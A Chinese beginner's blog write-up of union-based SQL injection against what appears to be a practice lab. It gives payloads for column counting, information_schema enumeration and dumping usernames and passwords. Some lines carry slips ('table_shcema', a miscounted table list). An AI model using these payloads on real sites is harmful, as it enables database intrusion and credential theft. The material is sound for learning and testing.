---
layout: post
title:  "我的SQL（1）"
desc: "新手上路"
keywords: "sql"
date: 2016-11-10
categories: [work]
tags: [blog]
icon: fa-bookmark-o
---

# Writeup
首先注入

>### ?id=1。

Ok。出现Your Login name和Password。

再添加一个单引号。
嗯？！出现sql语句报错，说明存在sql注入，因为没有过滤单引号，所以我们可以用单引号来做文章啦。

接下来，就是猜字段了。

>### ?id=1’ order by 3#

可怕的事出现了。报错了。#没有被编码。香菇。上网找了一下#的URL编码为%23

所以改为

>### ?id=1’ order by 3%23

有显示。试了一下4 。呐报错了。只有三个字段。

接下来就是查询啦啦啦、

>### ?id=1’ union select 1,2,3%23

What？为什么只显示了当`id=1`的东西。What？真让人头大。只好去看源码。

函数`mysql_fetch_array`只被调用了一次，而这个函数只能取得一行行为，也就是说，怎么变它也只能显示第一行的东西。也就是`id=1`。怎么办。让id=1出错？好像能行。

上网一搜。呐id的值通常都是从1开始自增的。我们可以把d设为非正数，浮点数，字符型或字符串都行。

试试?

>### id=0’ union select 1,2,3%23

OK！出来了。太棒了。开始真正搞事情了。、

但是只有两行，怎么列出所有的。呐不担心上网一搜什么都能告诉你。

数据库有一个连接函数，常用的是`concat`和`concat_ws`。其中`concat_ws`的第一个参数是连接字符串的分隔符。

{% highlight sql %}
?id=0' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())%23
{% endhighlight %}

呐。出来了出来了。第一个是当前用户，当前数据库和版本信息。

知道数据库名了。就去查数据库的表啦。。
（首先说一下`mysql`的数据库`information_schema`，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表

`SCHEMATA`表:储存`mysql`所有数据库的基本信息，包括数据库名，编码类型路径等，`show databases`的结果取之此表。

`TABLES`表:储存`mysql`中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。`show tables from schemaname`的结果取之此表

`COLUMNS`表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是`show columns from schemaname.tablename`的结果取之此表。）

摘自[这里](http://blog.csdn.net/u012763794/article/details/51207833)

介绍完就开干。

{% highlight sql %}
?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security'%23
{% endhighlight %}

数据库默认显示`limit 0,1`。第一个是`emails`。接着找，用`limit`来偏移。具体如下：

{% highlight sql %}

?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security' limit 1,1%23

?id=0’ union select 1,2,table_name from information_schema.tables where table_schema='security' limit 2,1%23

?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security'limit 3,1%23

{% endhighlight %}

分别是`refers`、`uagents`、`users`。

继续

{% highlight sql %}

?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security' limit 4,1%23

{% endhighlight %}

报错了。只有三个。可以下一步啦。

我们注入当然就只对用户密码有想法啦。所以去爆破`users`哈哈哈、

{% highlight sql %}
?id=0' union select 1,2,column_name from information_schema.columns where table_shcema='security' and table_name='users' limit 0,1%23
{% endhighlight %}

不断地偏移。到第四行就报错。也就说有3个字段。

分别是`id`、`username`、`password`

Ok！知道字段就开始获取数据啦。直接`select`出来就好啦。

{% highlight sql %}
?id=0' union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23
{% endhighlight %}

得到要得到数据。成功。Yeah！
